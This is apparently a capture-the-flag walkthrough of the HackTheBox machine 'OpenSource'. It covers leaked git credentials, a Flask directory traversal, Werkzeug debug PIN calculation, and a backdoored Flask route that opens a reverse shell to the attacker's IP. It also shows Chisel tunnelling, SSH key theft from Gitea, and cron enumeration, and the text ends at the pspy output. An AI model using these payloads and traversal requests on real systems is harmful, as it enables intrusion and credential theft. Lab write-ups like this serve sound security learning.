---
title: HTB: OpenSource
url: https://0xdf.gitlab.io/2022/10/08/htb-opensource.html
date: 2022-10-08T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, hackthebox, htb-opensource, nmap, upload, source-code, git, git-hooks, flask, directory-traversal, file-read, flask-debug, flask-debug-pin, youtube, chisel, gitea, pspy, htb-bitlab, werkzeug, werkzeug-debug
---

![OpenSource](https://0xdfimages.gitlab.io/img/opensource-cover.png)

OpenSource starts with a web application that has a downloadable source zip. That zip has a Git repo in it, and that leaks the production code as well as account creds. The website has a directory traversal vulnerability that allows me to read and write files. I’ll show two ways to get a shell. The first is abusing the file read to get the information to calculate the Flask debug pin. The later is overwriting one of the Flask source files to get execution. From there, I’ll access a private Gitea instance and find an SSH key to get a shell on the host. The host has a cron running Git commands as root, so I’ll use git hooks to abuse this and get a shell as root.

## Box Info

| Name | [OpenSource](https://hackthebox.com/machines/opensource)  [OpenSource](https://hackthebox.com/machines/opensource) [Play on HackTheBox](https://hackthebox.com/machines/opensource) |
| --- | --- |
| Release Date | [21 May 2022](https://twitter.com/hackthebox_eu/status/1526940722796154882) |
| Retire Date | 08 Oct 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for OpenSource |
| Radar Graph | Radar chart for OpenSource |
| First Blood User | 00:57:03[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 01:39:17[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [irogir irogir](https://app.hackthebox.com/users/476556) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80), and a filtered port (3000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.164
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-29 19:10 UTC
Nmap scan report for 10.10.11.164
Host is up (0.087s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp

Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.164
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-29 19:12 UTC
Nmap scan report for 10.10.11.164
Host is up (0.088s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Thu, 29 Sep 2022 19:12:29 GMT
...[snip]...
|_    </html>
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...[snip]...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.66 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu Bionic 18.04. The webserver is showing Werkzeug, a Python framework.

I’ll make note that I want to check out port 3000 from the host or some other perspective besides directly from my box.

### Website - TCP 80

#### Site

The site is for an opensource file sharing software:

![image-20220929152248265](https://0xdfimages.gitlab.io/img/image-20220929152248265.png)

The top of the page is just marketing, and the buttons don’t lead anywhere. The bottom section has two working links. The first, “Download”, points at `/download`, and returns `source.zip`.

The second, “Take me there!”, goes to `/upcloud`, where it says there’s a test instance. Loading that page shows an upload form:

![image-20220929153730986](https://0xdfimages.gitlab.io/img/image-20220929153730986.png)

If I give it a file (like a benign PNG), it reports back that it uploaded, and gives a path to the file, preserving the same file name I uploaded. If I upload the same filename again, it returns the same way (presumably overwriting the previous).

I’ll do a quick check to see if I can traverse up directories by sending the POST request to Burp Repeater and adding `../../../../../../../` to the start of the filename, but it seems to strip that and save it in the same place. I could spend time trying to bypass that filtering, but as I have the source, I’ll turn there.

#### Tech Stack

`nmap` identified that this was a Werkzeug Python server, so it’s likely running Flask. This is from the HTTP response headers:

```

HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Thu, 29 Sep 2022 19:21:59 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 5316
Connection: close

```

Not much else I can tell here.

I’ll skip the directory brute force because I have the source.

### Source Analysis

#### File Overview

The `source.zip` decompresses to two directories, two files, and a `.git` folder which shows it’s developed under Git version control:

```

oxdf@hacky$ ls -a
.  ..  app  build-docker.sh  config  Dockerfile  .git

```

The two files, `build-docker.sh` and `Dockerfile` indicate that the application is made to be run in a container under Docker. The `Dockerfile` shows that the image is built on `python:3-alpine`, which means I can expect very limited tools inside the container, other than Python. It installs `pip`, then `Flask`. It copies `supervisoerd.conf` from the `config` directory (the only file in that directory) into `/etc` in the container, and eventually runs `supervisord`, passing it that config. It also sets two environment variables, `PYTHONDONTWRITEBYTECODE=1` and `MODE="PRODUCTION"`.

`build-docker.sh` just removes the old image, creates a new one, and runs it:

```

#!/bin/bash
docker rm -f upcloud
docker build --tag=upcloud .
docker run -p 80:80 --rm --name=upcloud upcloud

```

#### Application

The `app` directory has two directories and two files. `INSTALL.md` is empty. `run.py` starts the Flask application by importing it from the `app` folder (I’ll expect to see an `app` object created in a `__init__.py` file in the `app` folder, and it is):

```

import os

from app import app

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 80))
    app.run(host='0.0.0.0', port=port)

```

The main work of the application is done from `views.py` (shown in its entirety):

```

import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

```

There are only two routes. This doesn’t match what I see on the site, but that makes sense, as this is the application I’m mean to run on my own infrastructure, not the site itself with the test instance.

The `upload_file` function handles both the upload form for a GET and saving the file for a POST. The `send_report` handles returning the uploaded file by getting it from `./public/uploads/`.

Both functions use the `get_file_name` function, which is imported from `app.utils`:

```

def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

```

`recursive_replace` uses recursion to remove a given string from the input. This recursive strategy is to get around a common vulnerability pattern where the site looks for and replaces `../` with an empty string, so the attacker sends in `....//`. When the pattern is removed, what remains is `../`.

```

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)

```

This effectively eliminates my ability to do a directory traversal attack using `../` to step out from the current directory for either read or write. If I try to read outside of `uploads`, it returns an error, which shows the cleaned URL:

```

oxdf@hacky$ curl --path-as-is http://10.10.11.164/uploads/../../run.py
<!doctype html>
<html lang=en>
  <head>
    <title>FileNotFoundError: [Errno 2] No such file or directory: '/app/public/uploads/run.py'
...[snip]...

```

#### Git

Looking at the Git history, there are only two commits:

```

oxdf@hacky$ git log --oneline
2c67a52 (HEAD -> public) clean up dockerfile for production use
ee9d9f1 initial

```

Looking at the difference between them, it seems that the only change was to remove the environment variable that sets Flask in Debug mode:

![image-20220929161138316](https://0xdfimages.gitlab.io/img/image-20220929161138316.png)

There is another branch in this repo, `dev`:

```

oxdf@hacky$ git branch -a
  dev
* public

```

I’ll switch to the dev branch in Git:

```

oxdf@hacky$ git checkout dev
Switched to branch 'dev'

```

This branch has four commits:

```

oxdf@hacky$ git log --oneline 
c41fede (HEAD -> dev) ease testing
be4da71 added gitignore
a76f8f7 updated
ee9d9f1 initial

```

Looking at the `git diff` for various commits, I’ll notice that a `app/.vscode/settings.json` file gets added in the second commit, and then deleted in the third:

![image-20220929171317866](https://0xdfimages.gitlab.io/img/image-20220929171317866.png)

There’s a password for dev01 in there. I’ll try it over SSH, but only key-based auth is supported.

#### dev Branch Application

Interestingly, in this `Dockerfile`, Flask debug mode is enabled:

```

# Set mode
ENV MODE="PRODUCTION"
ENV FLASK_DEBUG=1

```

The `FLASK_DEBUG` sets the application into debug mode, which provide a debug interface on errors, and reload the application on source changes. It also leads to an unintended way to get a shell.

This `views.py` has the views that I’m seeing on OpenSource:

```

import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))

@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

```

It adds `/download` for the `source.zip` and `/` with `index.html`, and moves the upload from `/` to `/upcloud`.

## Shell as root in Container

### Directory Traversal

#### Identify Issue

I noted that I won’t be able to get `../` through the `get_file_name` function, but there’s another way to get out of the intended directory. In both the read and write functions, my input goes into `get_file_name`, and the result is passed into an `os.path.join` call. For example, in the upload function:

```

	file_name = get_file_name(f.filename)
	file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)

```

So if I pass in “0xdf”, it generates the expected string, as demonstrated in this Python terminal:

```

oxdf@hacky$ python
Python 3.8.10 (default, Jun 22 2022, 20:18:18) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.path.join(os.getcwd(), "public", "uploads", "0xdf")
'/home/oxdf/opensource/public/uploads/0xdf'

```

However, if I pass in “/0xdf”, `os.path.join` does something interesting:

```

>>> os.path.join(os.getcwd(), "public", "uploads", "/0xdf")
'/0xdf'

```

This feels a bit unexpected, but it is the intended behavior according to [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

#### Knowing Absolute Path

The `Dockerfile` shows that the command run is `supervisord` using the config file from `config`:

```

[supervisord]
user=root
nodaemon=true
logfile=/dev/null
logfile_maxbytes=0
pidfile=/run/supervisord.pid

[program:flask]
command=python /app/run.py
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

```

This shows that it’s running `/app/run.py`, which shows the absolute path to the application in the container.

#### Directory Traversal

Knowing this, I might think I can do something like `curl --path-as-is http://10.10.11.164/uploads//app/run.py`, but it doesn’t work:

```

oxdf@hacky$ curl --path-as-is http://10.10.11.164/uploads//app/run.py
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://10.10.11.164/uploads/app/run.py">http://10.10.11.164/uploads/app/run.py</a>. If not, click the link.

```

Before the request gets to Flask to process, a redirect to a “normalized” URL is being sent, which breaks my exploit. This isn’t specific to the exploit attempt. For example, just reading the legit uploaded file with an extra `/` does that same thing:

```

oxdf@hacky$ curl --path-as-is http://10.10.11.164/uploads//htb.png
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://10.10.11.164/uploads/htb.png">http://10.10.11.164/uploads/htb.png</a>. If not, click the link.

```

I noted above that URLs with `../` did make it to Flask, where they were cleaned out. I can’t quite explain why `//` isn’t allowed through, but `..//` is, but it is. I’ll combine these two to get a working file read anywhere on the system:

```

oxdf@hacky$ curl --path-as-is http://10.10.11.164/uploads/..//etc/os-release
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.15.1
PRETTY_NAME="Alpine Linux v3.15"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://bugs.alpinelinux.org/"

```

### Shell via Flask Debug [Unintended]

#### Access Debug

I noted above that in the git branch that lines up with this instance, `FLASK_DEBUG` was set to 1, which enables it. In fact, I saw the debug output come back when I put in an invalid path just above. It’s clearer in Firefox:

![image-20220929174122288](https://0xdfimages.gitlab.io/img/image-20220929174122288.png)

Clicking on the terminal pops a prompt for a pin to access it:

![image-20220929174204672](https://0xdfimages.gitlab.io/img/image-20220929174204672.png)

This pin prints to the screen when the debug instance of Flask is started looking something like:

```

$ docker run -p 7777:7777 werkzeug-debug-console:latest
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://172.17.0.4:7777/ (Press CTRL+C to quit)
 * Restarting with stat
User: werkzeug-user
Module: flask.app
Module Name: Flask
App Location: /usr/local/lib/python3.9/site-packages/flask/app.py
Mac Address: 2485377892356
Werkzeug Machine ID: b'ea1fc30b6f4a173cea015d229c6b55b69d0ff00819670374d7a02397bc236523a57e9bab0c6e6167470ac65b66075388'
 * Debugger is active!
 * Debugger PIN: 118-831-072

```

#### Collect PIN Information

There’s a handful of articles out there that talk about how to recreate the Flask debug PIN, the most common being on daehee.com. I found that one very frustrating as it’s 95% correct, but a couple sentences are missing that make it not work here. [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit) has the complete writeup.

The function that generates the `pin` is `get_pin_and_cookie_name`, which the article shows being from `python3.5/site-packages/werkzeug/debug/__init__.py`. The debug crash will help me orient on the file system:

![image-20220930063345466](https://0xdfimages.gitlab.io/img/image-20220930063345466.png)

Putting those together, I’ll read `/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py`:

```

...[snip]...
def get_pin_and_cookie_name(                                                                                                                              
    app: "WSGIApplication",                                                                                                                               
) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:                        
    """Given an application object this returns a semi-stable 9 digit pin                                                                                 
    code and a random key.  The hope is that this is stable between          
    restarts to not make debugging particularly frustrating.  If the pin     
    was forcefully disabled this returns `None`.                             
                                                                             
    Second item in the resulting tuple is the cookie name for remembering.   
    """                                                                      
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")                               
    rv = None                                                                
    num = None
...[snip]...

```

It’s important to get the version from the target, because there are some slight differences with what’s shown on HackTricks.

I’ll grab the script from HackTricks and save it on my machine as `generate_pin.py`. The top has the variables I need to set:

```

import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

```

I’ve already got all I need for the `probably_public_bits`:
- `username` is root, as shown in the `supervisoerd.conf` file
- `modname` and the next one are just `flask.app` and `Flask`
- The last `probably_public_bits` item is the path from the crash, the same one I used just above to get the location of the debug `__init__.py`.

To get the MAC address, `/proc/net/arp` will return it:

```

oxdf@hacky$ curl --path-as-is --ignore-content-length http://10.10.11.164/uploads/..//proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.17.0.1       0x1         0x2         02:42:90:98:18:9e     *        eth0

```

I need `--ignore-content-length` because the content length on some of these files is off, and it can lead to missing information, as shown in [this quick video](https://www.youtube.com/watch?v=Cife4ejJGlo):

The MAC will also be in `/sys/class/net/[device id]/address`. If I don’t know the device id, I can take some guesses and it comes back from `eth0`:

```

oxdf@hacky$ curl --path-as-is --ignore-content-length http://10.10.11.164/uploads/..//sys/class/net/eth0/address
02:42:ac:11:00:08

```

I’ll convert that to a base-10 int in Python by adding `0x` to the front and removing the `:`:

```

oxdf@hacky$ python -c "print(0x0242ac110008)"
2485377892360

```

Finally, I need the result of `get_machine_id`. The blogs describe this as:

> read the value in `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` and return directly if there is, sometimes it might be required to append a piece of information within `/proc/self/cgroup` that you find at the end of the first line (after the third slash)

I find the actual code more clear:

```

def get_machine_id() -> t.Optional[t.Union[str, bytes]]:                                                                                                  
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -> t.Optional[t.Union[str, bytes]]:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id": 
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

        # On OS X, use ioreg to get the computer's serial number.
        try:
...[snip]...

```

It starts with an empty string, and then tried to append both the contents of `/etc/machine-id` and `/proc/sys/kernel/random/boot_id`. Then there’s a section on containers so it tries to append part of `/proc/self/cgroup`.

`/etc/machine-id` isn’t found, but the other two are:

```

oxdf@hacky$ curl --path-as-is http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id --ignore-content-length 
a97273a3-1bd3-4436-91ae-ab0973b75d73
oxdf@hacky$ curl --path-as-is http://10.10.11.164/uploads/..//proc/self/cgroup --ignore-content-length 
12:hugetlb:/docker/0b91b5646d729be7c8657d19a6140c946b56fe35bd7cd0e10d2d18ecea9d81c8
...[snip]...

```

From the second file there, I need only the first line, from the last `/` to the end. The script is now set up:

```

...[snip]...
probably_public_bits = [
    'root',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377892360',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'a97273a3-1bd3-4436-91ae-ab0973b75d730b91b5646d729be7c8657d19a6140c946b56fe35bd7cd0e10d2d18ecea9d81c8'# get_machine_id(), /etc/machine-id
]
...[snip]...

```

Unfortunately, the resulting PIN doesn’t work.

#### Hash Type

The script is creating a MD5 hash object, and adding pieces from above one by one to the hash. If I look more closely at the code from OpenSource, it’s doing the same thing, but using SHA1, not using MD5:

```

...[snip]...
	h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"
...[snip]...

```

The [Changelog for Werkzeug version 2.0.0](https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0) lists this:

> - Use SHA-1 instead of MD5 for generating ETags and the debugger pin, and in some tests. MD5 is not available in some environments, such as FIPS 140. This may invalidate some caches since the ETag will be different. [#1897](https://github.com/pallets/werkzeug/issues/1897)

The change is made [here](https://github.com/pallets/werkzeug/commit/11ba286a1b907110a2d36f5c05740f239bc7deed#diff-83867b1c4c9b75c728654ed284dc98f7c8d4e8bd682fc31b977d122dd045178a).

I’ll update my script:

```

...[snip]...
#h = hashlib.md5()
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]
...[snip]...

```

Now it generates a PIN that works and gives a console where I can run Python commands:

![image-20220930074512302](https://0xdfimages.gitlab.io/img/image-20220930074512302.png)

#### Reverse Shell

With that shell, I can run OS commands with the `subprocess` module:

![image-20220930074749921](https://0xdfimages.gitlab.io/img/image-20220930074749921.png)

I’ll grab a Python reverse shell from [revshells.com](https://www.revshells.com/), paste it into the console, and execute it (there’s no line wrap, so only the end shows):

![image-20220930075036345](https://0xdfimages.gitlab.io/img/image-20220930075036345.png)

The reverse shell connects to my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.164 46930
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

```

### Shell by Replacing views.py

#### Generate Backdoored Version

Because the application is running in debug mode, it will reload any time any of the source files change. I’ll use this along with the upload ability to overwrite `views.py`.

I’ve got a copy of the `views.py` file that runs on OpenSource. At the bottom, I’ll add another route:

```

@app.route('/0xdf')
def rev():
    import socket
    import os
    import pty
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.6",443))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("sh")

```

On visiting `/0xdf`, it will generate a reverse shell to me.

#### Upload

I’ll set Burp to intercept, and upload this file. I’ll verify the new route is there, and modify the `filename` to abuse the same trick I used earlier to read:

[![image-20220930081422279](https://0xdfimages.gitlab.io/img/image-20220930081422279.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220930081422279.png)

#### Shell

I’ll listen with `nc -lvnp 443` and visit `http://10.10.11.164/0xdf`. A shell connects back:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.164 33120
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

```

This shell is a bit annoying, and output from Flask gets dumped into the socket periodically as well.

I’ll [upgrade the shell](https://www.youtube.com/watch?v=DqE6DxqJg8Q) using Python and `stty` (since `script` isn’t in the container):

```

/app # python3 -c 'import pty;pty.spawn("sh")'
python3 -c 'import pty;pty.spawn("sh")'
/app # ^Z      
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
/app # 

```

## Shell as dev01 on OpenSource

### Enumeration

#### Identify OpenSource

Even before getting a shell it was very clear that this application is running from a Docker container. Now as root inside this container, and with no flags yet, I need to figure out how to pivot to the host.

The IP address of this container is 172.17.0.8 (though that will different depending on my VPN IP):

```

/app # ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:08  
          inet addr:172.17.0.8  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:337 errors:0 dropped:0 overruns:0 frame:0
          TX packets:302 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:36134 (35.2 KiB)  TX bytes:81314 (79.4 KiB)

```

The default gateway for this box is 172.17.0.1, which is likely the host running the container:

```

/app # ip route
default via 172.17.0.1 dev eth0 
172.17.0.0/16 dev eth0 scope link  src 172.17.0.8

```

#### Identify Gitea

Remembering that there’s a service on port 3000 that I couldn’t access from my host, I’ll try to access that here. `curl` isn’t on the box, but `wget` is, and `-O-` will output to stdout:

```

/app # wget 172.17.0.1:3000 -O-
Connecting to 172.17.0.1:3000 (172.17.0.1:3000)
writing to stdout
<!DOCTYPE html>
<html lang="en-US" class="theme-">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title> Gitea: Git with a cup of tea</title>
...[snip]...

```

It’s an instance of [Gitea](https://gitea.io/en-us/), an open source Git management platform.

### Access Gitea

#### Tunnel

I’ll use [Chisel](https://github.com/jpillora/chisel) to create a tunnel from my host through the container to access Gitea. First, I’ll download the latest linux amd64 binary from the [release page](https://github.com/jpillora/chisel/releases), and host it on my box using a Python webserver (`python3 -m http.server 8000`). I’ll fetch that file to the container:

```

/tmp # wget http://10.10.14.6:8000/chisel_1.7.7_linux_amd64
Connecting to 10.10.14.6:8000 (10.10.14.6:8000)
saving to 'chisel_1.7.7_linux_amd64'
chisel_1.7.7_linux_a 100% |********************************| 7888k  0:00:00 ETA
'chisel_1.7.7_linux_amd64' saved

```

I’ll run the binary in server mode on my box:

```

oxdf@hacky$ ./chisel_1.7.7_linux_amd64 server -p 8000 --reverse
2022/09/30 12:47:55 server: Reverse tunnelling enabled
2022/09/30 12:47:55 server: Fingerprint umHn2gs0l5nc8jxdT2k/Ib4llURm3snZQNzX4WkaERw=
2022/09/30 12:47:55 server: Listening on http://0.0.0.0:8000

```

I need to give it a port to listen on (`-p 8000`) because the default port of 8080 is already in use by Burp. `--reverse` allows me to create reverse tunnels.

Now I’ll connect with `chisel` from the container:

```

/tmp # chmod +x chisel_1.7.7_linux_amd64 
/tmp # ./chisel_1.7.7_linux_amd64 client 10.10.14.6:8000 R:3000:172.17.0.1:3000
2022/09/30 12:52:19 client: Connecting to ws://10.10.14.6:8000
2022/09/30 12:52:20 client: Connected (Latency 87.429342ms)

```

`R:3000:172.17.0.1:3000` says to listen on my box on port 3000, and forward anything that comes to that through the container to 172.17.0.1:3000.

In Firefox, I can now access Gitea:

![image-20220930085329050](https://0xdfimages.gitlab.io/img/image-20220930085329050.png)

#### Log In

I’ll remember the credentials from earlier for dev01, “Soulless\_Developer#2022”. I’ll try those with the Gitea login, and it works:

![image-20220930085456633](https://0xdfimages.gitlab.io/img/image-20220930085456633.png)

There’s a repo called home-backup, and it looks to be a backup of the account’s home directory:

![image-20220930085531653](https://0xdfimages.gitlab.io/img/image-20220930085531653.png)

In `.ssh`, there’s a RSA key-pair used. The `id_rsa` is the private key:

[![image-20220930085648524](https://0xdfimages.gitlab.io/img/image-20220930085648524.png)](https://0xdfimages.gitlab.io/img/image-20220930085648524.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220930085648524.png)

I’ll save that to a file on my host.

### SSH

Making sure the permissions are 600 so that SSH will trust the key, I’ll then connect to OpenSource as dev01:

```

oxdf@hacky$ chmod 600 ~/keys/opensource-dev01
oxdf@hacky$ ssh -i ~/keys/opensource-dev01 dev01@10.10.11.164
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)
...[snip]...
dev01@opensource:~$

```

Now I can read the user flag:

```

dev01@opensource:~$ cat user.txt
11adee04************************

```

## Shell as root

### Enumeration

#### sudo

I’ll try to check if dev01 can run any commands as root. It requires a password:

```

dev01@opensource:/$ sudo -l
[sudo] password for dev01:

```

I’ll try the password from above, “Soulless\_Developer#2022”, and it works, but dev01 can’t run anything with `sudo`:

```

dev01@opensource:/$ sudo -l
[sudo] password for dev01: 
Sorry, user dev01 may not run sudo on opensource.

```

#### Homedirs

There’s nothing much besides a flag in dev01’s homedir:

```

dev01@opensource:~$ ls -la
total 44
drwxr-xr-x 7 dev01 dev01 4096 May 16 12:51 .
drwxr-xr-x 4 root  root  4096 May 16 12:51 ..
lrwxrwxrwx 1 dev01 dev01    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r-- 1 dev01 dev01  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dev01 dev01 3771 Apr  4  2018 .bashrc
drwx------ 2 dev01 dev01 4096 May  4 16:35 .cache
drwxrwxr-x 8 dev01 dev01 4096 Sep 30 13:08 .git
drwx------ 3 dev01 dev01 4096 May  4 16:35 .gnupg
drwxrwxr-x 3 dev01 dev01 4096 May  4 16:35 .local
-rw-r--r-- 1 dev01 dev01  807 Apr  4  2018 .profile
drwxr-xr-x 2 dev01 dev01 4096 May  4 16:35 .ssh
-rw-r----- 1 root  dev01   33 Sep 30 10:54 user.txt

```

There is one other home directory, for the git user:

```

dev01@opensource:/home$ ls
dev01  git

```

In the directory, there’s only one directory (`.ssh`) that I can’t access, and `.gitconfig`:

```

dev01@opensource:/home/git$ la -la
total 16
drwxr-xr-x 3 git  git  4096 May  4 16:35 .
drwxr-xr-x 4 root root 4096 May 16 12:51 ..
-rw-r--r-- 1 git  git   112 Apr 27 20:32 .gitconfig
drwx------ 2 git  git  4096 May  4 16:35 .ssh
dev01@opensource:/home/git$ cat .gitconfig 
[user]
        name = Gitea
        email = gitea@fake.local
[core]
        quotePath = false
[receive]
        advertisePushOptions = true

```

#### pspy

There’s not much of interest in the process list, but I’ll upload [pspy](https://github.com/DominicBreuker/pspy) to look for any processes that run periodically. I’ll download the latest release, and serve it with Python webserver. From OpenSource, I’ll fetch the file into `/tmp`:

```

dev01@opensource:/tmp$ wget 10.10.14.6/pspy64
--2022-09-30 13:16:54--  http://10.10.14.6/pspy64
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                 100%[===================================>]   2.94M  1.68MB/s    in 1.7s    

2022-09-30 13:16:56 (1.68 MB/s) - ‘pspy64’ saved [3078592/3078592]

```

I’ll make it executable and run it:

```

dev01@opensource:/tmp$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
...[snip]...

```

Every minute, there’s a cron that runs as root that starts with `/usr/local/bin/git-sync`:

```

2022/09/30 13:19:01 CMD: UID=0    PID=18961  | /bin/sh -c /usr/local/bin/git-sync
                         2022/09/30 13:19:01 CMD: UID=0    PID=18960  | /bin/sh -c /usr/local/bin/git-sync
2022/09/30 13:19:01 CMD: UID=0    PID=18959  | /usr/sbin/CRON -f
2022/09/30 13:19:01 CMD: UID=0    PID=18964  | git add .
